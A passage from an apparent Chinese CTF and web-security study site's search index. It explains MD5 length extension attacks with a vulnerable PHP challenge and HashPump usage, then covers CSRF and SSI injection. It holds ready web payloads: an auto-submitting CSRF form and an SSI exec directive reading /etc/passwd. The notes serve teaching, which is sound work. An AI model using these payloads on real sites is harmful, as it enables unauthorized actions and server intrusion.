urllib.quote(base64.b64encode(newIv))\n\u8fd9\u662f\u4fee\u6539IV\u7684\n</code></pre>"},{"location":"web_bak/crypto/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D/","title":"MD5\u6269\u5c55\u653b\u51fb\u4ecb\u7ecd","text":"<p>hash\u957f\u5ea6\u62d3\u5c55\u653b\u51fb</p> <p>\u54c8\u5e0c\u957f\u5ea6\u6269\u5c55\u653b\u51fb(hash lengthextensionattacks)\u662f\u6307\u9488\u5bf9\u67d0\u4e9b\u5141\u8bb8\u5305\u542b\u989d\u5916\u4fe1\u606f\u7684\u52a0\u5bc6\u6563\u5217\u51fd\u6570\u7684\u653b\u51fb\u624b\u6bb5\u3002\u6b21\u653b\u51fb\u9002\u7528\u4e8eMD5\u548cSHA-1\u7b49\u57fa\u4e8eMerkle\u2013Damg\u00e5rd\u6784\u9020\u7684\u7b97\u6cd5\u3002</p> <p>\u7275\u626f\u5230\u5bc6\u7801\u5b66\uff0c\u6211\u4e2a\u4eba\u5c31\u76f4\u63a5\u5f00\u642c\u4e86</p>"},{"location":"web_bak/crypto/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D/#md5","title":"MD5\u6269\u5c55\u653b\u51fb\u4ecb\u7ecd","text":"<p>\u6211\u4eec\u9700\u8981\u4e86\u89e3\u4ee5\u4e0b\u51e0\u70b9md5\u52a0\u5bc6\u8fc7\u7a0b\uff1a</p> <p>MD5\u52a0\u5bc6\u8fc7\u7a0b\u4e2d512\u6bd4\u7279\uff0864\u5b57\u8282\uff09\u4e3a\u4e00\u7ec4\uff0c\u5c5e\u4e8e\u5206\u7ec4\u52a0\u5bc6\uff0c\u800c\u4e14\u5728\u8fd0\u7b97\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5c06512\u6bd4\u7279\u5206\u4e3a32bit*16\u5757\uff0c\u5206\u5757\u8fd0\u7b97</p> <p>\u5173\u952e\u5229\u7528\u7684\u662fMD5\u7684\u586b\u5145\uff0c\u5bf9\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u586b\u5145(\u6bd4\u7279\u7b2c\u4e00\u4f4d\u4e3a1\u5176\u4f59\u6bd4\u7279\u4e3a0)\uff0c\u4f7f\u4e4b(\u4e8c\u8fdb\u5236)\u8865\u5230448\u6a21512\u540c\u4f59\uff0c\u5373\u957f\u5ea6\u4e3a512\u7684\u500d\u6570\u51cf64\uff0c\u6700\u540e\u768464\u4f4d\u5728\u8865\u5145\u4e3a\u539f\u6765\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u8fd9\u6837\u521a\u597d\u8865\u6ee1512\u4f4d\u7684\u500d\u6570\uff0c\u5982\u679c\u5f53\u524d\u660e\u6587\u6b63\u597d\u662f512bit\u500d\u6570\u5219\u518d\u52a0\u4e0a\u4e00\u4e2a512bit\u7684\u4e00\u7ec4\u3002 MD5\u4e0d\u7ba1\u600e\u4e48\u52a0\u5bc6\uff0c\u6bcf\u4e00\u5757\u52a0\u5bc6\u5f97\u5230\u7684\u5bc6\u6587\u4f5c\u4e3a\u4e0b\u4e00\u6b21\u52a0\u5bc6\u7684\u521d\u59cb\u5411\u91cf\u3002</p> <p>\u4e3e\u4e00\u4e2a\u4f8b\u5b50\u8bb2\u4e00\u4e0b\u5982\u4f55\u586b\u5145\uff1a\u6bd4\u5982\u5b57\u7b26\u4e32\u201cAcker\u201d \u5341\u516d\u8fdb\u52360x41636b6572\u8fd9\u91cc\u4e0e448\u6a21512\u4e0d\u540c\u4f59\uff0c\u9700\u8865\u4f4d\u6ee1\u8db3\u4e8c\u8fdb\u5236\u957f\u5ea6\u4f4d512\u7684\u500d\u6570\uff0c\u8865\u4f4d\u540e\u7684\u6570\u636e\u5982\u4e0b\uff1a</p> <pre><code>0x61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000\n</code></pre> <p>\u6b64\u5904\u8865\u5145\uff1a\u4ee5\u5341\u516d\u8fdb\u5236\u8868\u793a\u4e00\u5171\u662f128\u4e2a\u5b57\u7b26\uff0c\u5341\u516d\u8fdb\u5236\u6bcf\u4e2a\u5b57\u7b26\u80fd\u591f\u8f6c\u6362\u62104\u4f4d\u4e8c\u8fdb\u5236\uff0c128*4=512\u8fd9\u5c31\u662f\u4e00\u7ec4\uff0c\u6b63\u597d\u662f512bit\u3002</p> <p></p> <p>\u4e0a\u56fe\u4e2d\u76848\u662f\u56e0\u4e3a\u8865\u4f4d\u65f6\u4e8c\u8fdb\u5236\u7b2c\u4e00\u4f4d\u8981\u88651\uff0c\u90a3\u4e481000\u8f6c\u6362\u621016\u8fdb\u5236\u5c31\u662f8.\u540e\u9762\u90fd\u8865\u4e0a0.</p> <p></p> <p>\u586b\u5145\u6570\u636e\u6700\u540e8\u5b57\u8282\u957f\u5ea6\uff0cAcker\u957f\u5ea6\u4e3a5*8=40bit\uff0c\u53c8\u56e0\u4e3a0x28=40\u6240\u4ee516\u8fdb\u5236\u663e\u793a\u4e3a28.</p> <p>\u4e3a\u4ec0\u4e48\u6570\u636e\u4f1a\u5728\u5de6\u7aef\uff1aMD5\u4e2d\u50a8\u5b58\u7684\u90fd\u662f\u5c0f\u7aef\u65b9\u5f0f\uff0c\u6bd4\u59820x12345678\uff0c\u90a3\u4e48md5\u5b58\u50a8\u987a\u5e8f\u5c31\u662f0x78563412</p>"},{"location":"web_bak/crypto/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D/#md5_1","title":"MD5\u62d3\u5c55\u653b\u51fb\u6f14\u793a","text":"<p>\u4e0b\u56fe\u4e3a\u52a0\u5bc6\u6d41\u7a0b\u56fe\uff0c\u53ef\u4ee5\u66f4\u76f4\u89c2\u770b\u6e05\u695a\u6574\u4e2a\u6d41\u7a0b\u3002</p> <p></p> <p>\u9009\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f8b\u5982\u201cAcker\u201dMD5\uff08\u201cAcker\u201d\uff09= dee2fb2df156f4040f893d8a10ac1034</p> <p>\u73b0\u5728\u6211\u4eec\u4e0d\u9700\u8981\u77e5\u9053\u5b57\u7b26\u4e32\u662f\u4ec0\u4e48\u3002\u53ea\u9700\u8981\u77e5\u9053\u5176\u957f\u5ea6\uff0c\u5e76\u5c06\u5b57\u7b26\u4e32\u586b\u5145\u5b8c\uff0c\u65b0\u52a0\u4e00\u4e2a\u5b57\u7b26\u4e32\u5982\uff1aaddition\uff0c\u4e4b\u524d\u5f97\u5230\u7684\u201cAcker\u201dMD5\u503c\u4f5c\u4e3a\u6700\u540e\u4e00\u5757\u52a0\u5bc6\u7684\u521d\u59cb\u5411\u91cf\uff0c\u6700\u540e\u5f97\u5230\u7684\u7ed3\u679c\u548cMD5\uff08\u201cAcker+addition\u201d\uff09\u662f\u4e00\u6837\u7684\u3002</p> <pre><code>&lt;?php \n$flag = \"flag{flag is here}\";\n$secret = \"aaaaabbbbbccccc\"; // This secret is 15 characters long for security!\n@$username = $_POST[\"username\"];\n@$password = $_POST[\"password\"];\nif (!empty($_COOKIE[\"getmein\"])) {\n    if (urldecode($username) === \"admin\" &amp;&amp; urldecode($password) != \"admin\") {\n        if ($_COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) {\n            echo \"Congratulations! You are a registered user.\\n\";\n            die (\"The flag is \". $flag);\n        }\n        else {\n            die (\"Your cookies don't match up! STOP HACKING THIS SITE.\");\n        }\n    }\n    else {\n        die (\"You are not an admin! LEAVE.\");\n    }\n}\nsetcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7));\nif (empty($_COOKIE[\"source\"])) {\n    setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7));\n}\nelse {\n    if ($_COOKIE[\"source\"] != 0) {\n        echo \"\"; // This source code is outputted here\n    }\n}\n?&gt;\n</code></pre> <p>\u9898\u76ee\u4e2d\u53ef\u4ee5\u5f97\u5230\uff1a</p> <p>$secret\u7684\u957f\u5ea615</p> <p>md5($secret.\"adminadmin\")\u7684\u503c\u4e3a571580b26c65f306376d4f64e53cb5c7</p> <p>\u4f7f\u7528hashpump\uff0c\u65b9\u6cd5\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u7b2c\u4e00\u884c\u662f\u4e00\u4e2a\u65b0\u7b7e\u540d\u4f5c\u4e3agetmein\u53c2\u6570\u63d0\u4ea4</p> <p>\u7b2c\u4e8c\u884c\u4f5c\u4e3apassword\u63d0\u4ea4\u5373\u53ef\u3002</p> <p></p>"},{"location":"web_bak/crypto/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D/#hashpump","title":"\u9644\uff1ahashpump","text":"<p>HashPump\u662f\u4e00\u4e2a\u501f\u52a9\u4e8eOpenSSL\u5b9e\u73b0\u4e86\u9488\u5bf9\u591a\u79cd\u6563\u5217\u51fd\u6570\u7684\u653b\u51fb\u7684\u5de5\u5177\uff0c\u652f\u6301\u9488\u5bf9MD5\u3001CRC32\u3001SHA1\u3001SHA256\u548cSHA512\u7b49\u957f\u5ea6\u6269\u5c55\u653b\u51fb\u3002\u800cMD2\u3001SHA224\u548cSHA384\u7b97\u6cd5\u4e0d\u53d7\u6b64\u653b\u51fb\u7684\u5f71\u54cd\uff0c\u56e0\u5176\u90e8\u5206\u907f\u514d\u4e86\u5bf9\u72b6\u6001\u53d8\u91cf\u7684\u8f93\u51fa\uff0c\u5e76\u4e0d\u8f93\u51fa\u5168\u90e8\u7684\u72b6\u6001\u53d8\u91cf\u3002</p> <p>\u5b89\u88c5</p> <pre><code>git clone https://github.com/bwall/HashPump\napt-get install g++ libssl-dev\ncd HashPump\nmake\nmake install\n</code></pre> <p></p> <p>\u4f7f\u7528\u65b9\u6cd5</p> <p>\u641c\u904d\u767e\u5ea6\uff0c\u65e0\u5948\u6ca1\u6709\u4ec0\u4e48\u5177\u4f53\u8bb2\u89e3\u65b9\u6cd5\u53ea\u597dhashpump -h\u5f97\u5230\u5e2e\u52a9\uff0c\u51d1\u5408\u770b\u4e00\u4e0b\u5427\u3002\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u5c31\u662f\u77e5\u9053\u524d\u9762\u5b57\u7b26\u603b\u957f\u5ea6\uff0c\u77e5\u9053\u4e0b\u4e00\u7ec4\u8ffd\u52a0\u6570\u636e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u81ea\u52a8\u7b97\u51fa\u524d\u4e00\u7ec4\u7684\u586b\u5145\u6570\u636e\u3002</p> <pre><code>\u279c  HashPump git:(master) \u2717 hashpump -h\nHashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]\nHashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.\n-h --help          Display this message.\n-t --test          Run tests to verify each algorithm is operating properly.\n-s --signature     The signature from known message.\n-d --data          The data from the known message.\n-a --additional    The information you would like to add to the known message.\n-k --keylength     The length in bytes of the key being used to sign the original message with.\nVersion 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.\n&lt;Developed by bwall(@botnet_hunter)&gt;\n</code></pre> <p>\u539f\u7406\u80af\u5b9a\u662f\u9700\u8981\u4e86\u89e3\u7684\uff0c\u4f46\u5728\u539f\u7406\u4e86\u89e3\u4e4b\u524d\uff0c\u6211\u4e48\u4f60\u53ef\u4ee5\u5148\u501f\u52a9\u5de5\u5177\u6765\u5b8c\u6210\u7834\u8bd1\u3002</p>"},{"location":"web_bak/csrf_ssrf_ssi/CSRF/","title":"CSRF","text":"<p>csrf\uff08Cross Site Request Forgery\uff09\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020</p> <p>\u9ad8\u7ea7\u4e00\u70b9\u7684XSS</p> <p>\u7ad9\u662f\u901a\u8fc7cookie\u6765\u8bc6\u522b\u7528\u6237\u7684\uff0c\u5f53\u7528\u6237\u6210\u529f\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u4e4b\u540e\u6d4f\u89c8\u5668\u5c31\u4f1a\u5f97\u5230\u4e00\u4e2a\u6807\u8bc6\u5176\u8eab\u4efd\u7684cookie\uff0c\u53ea\u8981\u4e0d\u5173\u95ed\u6d4f\u89c8\u5668\u6216\u8005\u9000\u51fa\u767b\u5f55\uff0c\u4ee5\u540e\u8bbf\u95ee \u8fd9\u4e2a\u7f51\u7ad9\u4f1a\u5e26\u4e0a\u8fd9\u4e2acookie</p> <p>\u5982\u679c\u8fd9\u671f\u95f4\u6d4f\u89c8\u5668\u88ab\u4eba\u63a7\u5236\u7740\u8bf7\u6c42\u4e86\u8fd9\u4e2a\u7f51\u7ad9\u7684url\uff0c\u53ef\u80fd\u5c31\u4f1a\u6267\u884c\u4e00\u4e9b\u7528\u6237\u4e0d\u60f3\u505a\u7684\u529f\u80fd\uff08\u6bd4\u5982\u4fee\u6539\u4e2a\u4eba\u8d44\u6599\uff09</p> <p>\u8fd9\u4e2a\u8bf7\u6c42\u5e76\u4e0d\u662f\u7528\u6237\u771f\u6b63\u60f3\u53d1\u51fa\u7684\u8bf7\u6c42\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u7684&lt;\u8bf7\u6c42\u4f2a\u9020&gt;</p> <p>\u56e0\u4e3a\u8fd9\u4e9b\u8bf7\u6c42\u4e5f\u662f\u53ef\u4ee5\u4ece\u7b2c\u4e09\u65b9\u7f51\u7ad9\u63d0\u4ea4\u7684\uff0c\u6240\u4ee5\u524d\u9762\u52a0\u4e0a&lt;\u8de8\u7ad9&gt;\u4e8c\u5b57</p> <p>\u6240\u4ee5\u7ecf\u5e38XSS\u6240\u5f39\u51fa\u7684cookie\u662f\u7528\u6765\u505acsrf\u8bf7\u6c42\u4f2a\u9020\u7684\u3002</p> <p>\u6bd4\u5982\u6211\u4eec\u6253\u7b97\u653b\u51fb\u4e00\u4e2a\u5b58\u5728\u95ee\u9898\u7684Blog\uff0c\u90a3\u5c31\u5148\u53bb\u76ee\u6807Blog\u7559\u8a00\uff0c\u7559\u4e0b\u4e00\u4e2a\u7f51\u5740\uff0c\u8bf1\u5176Blog\u7684\u4e3b\u4eba\u70b9\u51fb\uff08\u5f53\u7136\uff0c\u8fd9\u662f\u4e00\u79cd\u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6211\u4eec\u4e0a\u8282\u8bfe\u8bb2\u7684XSS\uff09\uff0c\u7136\u540e\u6784\u9020\u4e2aHTML\u8868\u5355\u63d0\u4ea4\u4e9b\u6570\u636e\u8fc7\u53bb\u3002</p>"},{"location":"web_bak/csrf_ssrf_ssi/CSRF/#_1","title":"\u6f0f\u6d1e\u793a\u4f8b","text":"<p>\u4e00\u4e2a\u5178\u578b\u7684CSRF\u653b\u51fb\u6709\u7740\u5982\u4e0b\u7684\u6d41\u7a0b\uff1a</p> <p>\u53d7\u5bb3\u8005\u767b\u5f55a.com\uff0c\u5e76\u4fdd\u7559\u4e86\u767b\u5f55\u51ed\u8bc1\uff08Cookie\uff09\u3002\u653b\u51fb\u8005\u5f15\u8bf1\u53d7\u5bb3\u8005\u8bbf\u95ee\u4e86b.com\u3002b.com \u5411 a.com \u53d1\u9001\u4e86\u4e00\u4e2a\u8bf7\u6c42\uff1aa.com/act=xx\u3002\u6d4f\u89c8\u5668\u4f1a\u9ed8\u8ba4\u643a\u5e26a.com\u7684Cookie\u3002a.com\u63a5\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u5bf9\u8bf7\u6c42\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5e76\u786e\u8ba4\u662f\u53d7\u5bb3\u8005\u7684\u51ed\u8bc1\uff0c\u8bef\u4ee5\u4e3a\u662f\u53d7\u5bb3\u8005\u81ea\u5df1\u53d1\u9001\u7684\u8bf7\u6c42\u3002a.com\u4ee5\u53d7\u5bb3\u8005\u7684\u540d\u4e49\u6267\u884c\u4e86act=xx\u3002\u653b\u51fb\u5b8c\u6210\uff0c\u653b\u51fb\u8005\u5728\u53d7\u5bb3\u8005\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u5192\u5145\u53d7\u5bb3\u8005\uff0c\u8ba9a.com\u6267\u884c\u4e86\u81ea\u5df1\u5b9a\u4e49\u7684\u64cd\u4f5c\u3002</p> <p>GET\u578b</p> <pre><code>&lt;img src=http://xxx.org/csrf.php?xx=1 /&gt;\n\u8bbf\u95ee\u9875\u9762\u540e\u5c31\u6210\u529f\u5411http://xxx.org/csrf.php \u53d1\u9001\u4e86\u4e00\u6b21\u8bf7\u6c42\n&lt;link href=\"\u2026\"&gt;\n&lt;iframe src=\"\u2026\"&gt;\n&lt;meta http-equiv=\"refresh\" content=\"0; url=\u2026\"&gt;\n&lt;script src=\"\u2026\"&gt;\n&lt;video src=\"\u2026\"&gt;\n&lt;audio src=\"\u2026\"&gt;\n&lt;a href=\"\u2026\"&gt;\n&lt;table background=\"\u2026\"&gt;\n</code></pre> <p>POST\u578b</p> <pre><code>&lt;form action=http://woyun.org/csrf.php method=POST&gt;\n&lt;input type=\"text\" name='xx' value='11' /&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit();&lt;/script&gt;\n</code></pre>"},{"location":"web_bak/csrf_ssrf_ssi/CSRF/#_2","title":"\u4f8b\u9898","text":"<p>\u4ece\u4e00\u9053\u9ad8\u8d28\u91cf\u7684ctf\u9898\u4e2d\u770b\u6e17\u900f\u6d4b\u8bd5 - \u5b89\u5168\u5ba2\uff0c\u5b89\u5168\u8d44\u8baf\u5e73\u53f0</p> <p>\u6700\u8fd1\u505a\u4e86\u4e00\u9053\u8d28\u91cf\u633a\u4e0d\u9519\u7684ctf\u9898\uff0c\u6d89\u53caweb\u6e17\u900f\u3001sql\u6ce8\u5165\u3001csrf\u3001\u6743\u9650\u63d0\u5347\u7b49\u77e5\u8bc6\u70b9\uff0c\u6240\u4ee5\u7279\u5730\u91cd\u65b0\u81ea\u5df1\u642d\u4e86\u4e2a\u73af\u5883\u590d\u73b0\u4e86\u4e00\u4e0b\u8fd9\u9053\u9ad8\u8d28\u91cf\u7684ctf\u9898\u5206\u4eab\u7ed9\u5927\u5bb6\uff0c\u5e76\u8c08\u8c08\u4e00\u4e9b\u4e2a\u4eba\u7684\u611f\u609f\u3002</p> <p>https://www.anquanke.com/post/id/97567</p> <p>\u5927\u5bb6\u81ea\u5df1\u770b\u770b\uff1f\u786e\u5b9e\u662f\u9ad8\u7ea7\u70b9\u7684XSS,\u6bd4\u8f83\u91cd\u5408\uff0c\u4e0d\u505a\u8fc7\u591a\u53d9\u8ff0</p>"},{"location":"web_bak/csrf_ssrf_ssi/SSI/","title":"SSI","text":"<p>(shtml\u6f0f\u6d1e)</p> <p>SSI \u6ce8\u5165\u5168\u79f0Server-SideIncludes Injection\uff0c\u5373\u670d\u52a1\u7aef\u5305\u542b\u6ce8\u5165\u3002SSI \u662f\u7c7b\u4f3c\u4e8e CGI\uff0c\u7528\u4e8e\u52a8\u6001\u9875\u9762\u7684\u6307\u4ee4\u3002SSI \u6ce8\u5165\u5141\u8bb8\u8fdc\u7a0b\u5728 Web \u5e94\u7528\u4e2d\u6ce8\u5165\u811a\u672c\u6765\u6267\u884c\u4ee3\u7801\u3002</p>"},{"location":"web_bak/csrf_ssrf_ssi/SSI/#ssi_1","title":"SSI\u4ecb\u7ecd\u4e0e\u5229\u7528","text":"<p>SSI\u662f\u5d4c\u5165HTML\u9875\u9762\u4e2d\u7684\u6307\u4ee4\uff0c\u5728\u9875\u9762\u88ab\u63d0\u4f9b\u65f6\u7531\u670d\u52a1\u5668\u8fdb\u884c\u8fd0\u7b97\uff0c\u4ee5\u5bf9\u73b0\u6709HTML\u9875\u9762\u589e\u52a0\u52a8\u6001\u751f\u6210\u7684\u5185\u5bb9\uff0c\u800c\u65e0\u987b\u901a\u8fc7CGI\u7a0b\u5e8f\u63d0\u4f9b\u5176\u6574\u4e2a\u9875\u9762\uff0c\u6216\u8005\u4f7f\u7528\u5176\u4ed6\u52a8\u6001\u6280\u672f\u3002</p> <p>\u4ece\u6280\u672f\u89d2\u5ea6\u4e0a\u6765\u8bf4\uff0cSSI\u5c31\u662f\u5728HTML\u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u6ce8\u91ca\u884c\u8c03\u7528\u7684\u547d\u4ee4\u6216\u6307\u9488\uff0c\u5373\u5141\u8bb8\u901a\u8fc7\u5728HTML\u9875\u9762\u6ce8\u5165\u811a\u672c\u6216\u8fdc\u7a0b\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>\u5728\u5f88\u591a\u4e1a\u52a1\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\u4f1a\u663e\u793a\u5728\u9875\u9762\u4e2d\u3002\u6bd4\u5982\uff0c\u4e00\u4e2a\u5b58\u5728\u53cd\u5c04\u578bXSS\u6f0f\u6d1e\u7684\u9875\u9762\uff0c\u5982\u679c\u8f93\u5165\u7684payload\u4e0d\u662fXSS\u4ee3\u7801\u800c\u662fSSI\u7684\u6807\u7b7e\uff0c\u540c\u65f6\u670d\u52a1\u5668\u53c8\u5f00\u542f\u4e86\u5bf9SSI\u7684\u652f\u6301\u7684\u8bdd\u5c31\u4f1a\u5b58\u5728SSI\u6f0f\u6d1e\u3002</p> <p>\u4ece\u5b9a\u4e49\u4e2d\u770b\u51fa\uff0c\u9875\u9762\u4e2d\u6709\u4e00\u5c0f\u90e8\u5206\u662f\u52a8\u6001\u8f93\u51fa\u7684\u65f6\u5019\u4f7f\u7528SSI\uff0c\u6bd4\u5982\uff1a</p> <p>\u00b7       \u6587\u4ef6\u76f8\u5173\u7684\u5c5e\u6027\u5b57\u6bb5</p> <p>\u00b7       \u5f53\u524d\u65f6\u95f4</p> <p>\u00b7       \u8bbf\u5ba2IP</p> <p>\u00b7       \u8c03\u7528CGI\u7a0b\u5e8f</p>"},{"location":"web_bak/csrf_ssrf_ssi/SSI/#_1","title":"SSI","text":"<p>\u600e\u4e48\u8bf4\u5462\uff0c\u5176\u5b9e\u8bb2\u8d77\u6765\u8fd8\u633a\u7b80\u5355\u7684</p> <p>\u8fd9\u4e2a\u6f0f\u6d1e\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u5f00\u542f\u4e00\u4e2a\u6a21\u5f0f\u53eb\u505a\u6ce8\u91ca\u884c\u7684\u5199\u5165</p> <p>\u4e5f\u5c31\u662f\u6bd4\u5982\u4e00\u4e2aHTML\u7f51\u9875</p> <p>\u6211\u4eec\u53ef\u4ee5\u5199\u5165\u6ce8\u91ca</p> <p>\u7136\u540e\u521a\u597d\u8fd9\u6761\u6ce8\u91ca\u5b9e\u53ef\u4ee5\u4ee5\u67d0\u79cd\u65b9\u5f0f\u8fdb\u884c\u4ee3\u7801\u6267\u884c\u7684\u3002</p> <pre><code>\u5176\u4f59\u7684\u8bdd\u8fd8\u6709\uff1a\n\u2460\u663e\u793a\u670d\u52a1\u5668\u7aef\u73af\u5883\u53d8\u91cf&lt;#echo&gt;\n\u672c\u6587\u6863\u540d\u79f0\uff1a\n&lt;!\u2013#echo var=\"DOCUMENT_NAME\"\u2013&gt;\n\u73b0\u5728\u65f6\u95f4\uff1a\n&lt;!\u2013#echo var=\"DATE_LOCAL\"\u2013&gt;\n\u663e\u793aIP\u5730\u5740\uff1a\n&lt;! #echo var=\"REMOTE_ADDR\"\u2013&gt;\n\u2461\u5c06\u6587\u672c\u5185\u5bb9\u76f4\u63a5\u63d2\u5165\u5230\u6587\u6863\u4e2d&lt;#include&gt;\n&lt;! #include file=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n&lt;!--#include virtual=\"index.html\" --&gt;\n&lt;! #include virtual=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n&lt;!--#include virtual=\"/www/footer.html\" --&gt;\n\u6ce8\uff1afile\u5305\u542b\u6587\u4ef6\u53ef\u4ee5\u5728\u540c\u4e00\u7ea7\u76ee\u5f55\u6216\u5176\u5b50\u76ee\u5f55\u4e2d\uff0c\u4f46\u4e0d\u80fd\u5728\u4e0a\u4e00\u7ea7\u76ee\u5f55\u4e2d\uff0cvirtual\u5305\u542b\u6587\u4ef6\u53ef\u4ee5\u662fWeb\u7ad9\u70b9\u4e0a\u7684\u865a\u62df\u76ee\u5f55\u7684\u5b8c\u6574\u8def\u5f84\n\u2462\u663e\u793aWEB\u6587\u6863\u76f8\u5173\u4fe1\u606f&lt;#flastmod&gt;&lt;#fsize&gt;(\u5982\u6587\u4ef6\u5236\u4f5c\u65e5\u671f/\u5927\u5c0f\u7b49)\n\u6587\u4ef6\u6700\u8fd1\u66f4\u65b0\u65e5\u671f\uff1a\n&lt;! #flastmod file=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n\u6587\u4ef6\u7684\u957f\u5ea6\uff1a\n&lt;!\u2013#fsize file=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n\u2463\u76f4\u63a5\u6267\u884c\u670d\u52a1\u5668\u4e0a\u7684\u5404\u79cd\u7a0b\u5e8f&lt;#exec&gt;(\u5982CGI\u6216\u5176\u4ed6\u53ef\u6267\u884c\u7a0b\u5e8f)\n&lt;!\u2013#exec cmd=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n&lt;!--#exec cmd=\"cat /etc/passwd\"--&gt;\n&lt;!\u2013#exec cgi=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n&lt;!--#exec cgi=\"/cgi-bin/access_log.cgi\"\u2013&gt;\n\u76f8\u5f53\u4e8e\u5728\u670d\u52a1\u5668\u7aef\u6267\u884c\u4e86\u6240\u9700\u8981\u7684\u4ee3\u7801\uff0c\u8fd4\u56de\u67e5\u627e\u5373\u53ef\n</code></pre>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/FastCGI/","title":"FastCGI","text":"<p>FastCGI\u6307\u5feb\u901f\u901a\u7528\u7f51\u5173\u63a5\u53e3\uff08Fast Common Gateway Interface\uff0fFastCGI\uff09\u662f\u4e00\u79cd\u8ba9\u4ea4\u4e92\u7a0b\u5e8f\u4e0eWeb\u670d\u52a1\u5668\u901a\u4fe1\u7684\u534f\u8bae\u3002FastCGI\u662f\u65e9\u671f\u901a\u7528\u7f51\u5173\u63a5\u53e3\uff08CGI\uff09\u7684\u589e\u5f3a\u7248\u672c\u3002FastCGI\u81f4\u529b\u4e8e\u51cf\u5c11\u7f51\u9875\u670d\u52a1\u5668\u4e0eCGI\u7a0b\u5e8f\u4e4b\u95f4\u4ea4\u4e92\u7684\u5f00\u9500\uff0c\u4ece\u800c\u4f7f\u670d\u52a1\u5668\u53ef\u4ee5\u540c\u65f6\u5904\u7406\u66f4\u591a\u7684\u7f51\u9875\u8bf7\u6c42\u3002</p> <p>\u4f17\u6240\u5468\u77e5\uff0c\u5728\u7f51\u7ad9\u5206\u7c7b\u4e2d\u5b58\u5728\u4e00\u79cd\u5206\u7c7b\u5c31\u662f\u9759\u6001\u7f51\u7ad9\u548c\u52a8\u6001\u7f51\u7ad9\uff0c\u4e24\u8005\u7684\u533a\u522b\u5c31\u662f\u9759\u6001\u7f51\u7ad9\u53ea\u9700\u8981\u901a\u8fc7\u6d4f\u89c8\u5668\u8fdb\u884c\u89e3\u6790\uff0c\u800c\u52a8\u6001\u7f51\u7ad9\u9700\u8981\u4e00\u4e2a\u989d\u5916\u7684\u7f16\u8bd1\u89e3\u6790\u7684\u8fc7\u7a0b\u3002\u4ee5Apache\u4e3a\u4f8b\uff0c\u5f53\u8bbf\u95ee\u52a8\u6001\u7f51\u7ad9\u7684\u4e3b\u9875\u65f6\uff0c\u6839\u636e\u5bb9\u5668\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5b83\u77e5\u9053\u8fd9\u4e2a\u9875\u9762\u4e0d\u662f\u9759\u6001\u9875\u9762\uff0cWeb\u5bb9\u5668\u5c31\u4f1a\u628a\u8fd9\u4e2a\u8bf7\u6c42\u8fdb\u884c\u7b80\u5355\u7684\u5904\u7406\uff0c\u7136\u540e\u5982\u679c\u4f7f\u7528\u7684\u662fCGI\uff0c\u5c31\u4f1a\u542f\u52a8CGI\u7a0b\u5e8f\uff08\u5bf9\u5e94\u7684\u5c31\u662fPHP\u89e3\u91ca\u5668\uff09\u3002\u63a5\u4e0b\u6765PHP\u89e3\u6790\u5668\u4f1a\u89e3\u6790php.ini\u6587\u4ef6\uff0c\u521d\u59cb\u5316\u6267\u884c\u73af\u5883\uff0c\u7136\u540e\u5904\u7406\u8bf7\u6c42\uff0c\u518d\u4ee5\u89c4\u5b9aCGI\u89c4\u5b9a\u7684\u683c\u5f0f\u8fd4\u56de\u5904\u7406\u540e\u7684\u7ed3\u679c\uff0c\u9000\u51fa\u8fdb\u7a0b\uff0cWeb server\u518d\u628a\u7ed3\u679c\u8fd4\u56de\u7ed9\u6d4f\u89c8\u5668\u3002\u8fd9\u5c31\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u52a8\u6001PHP 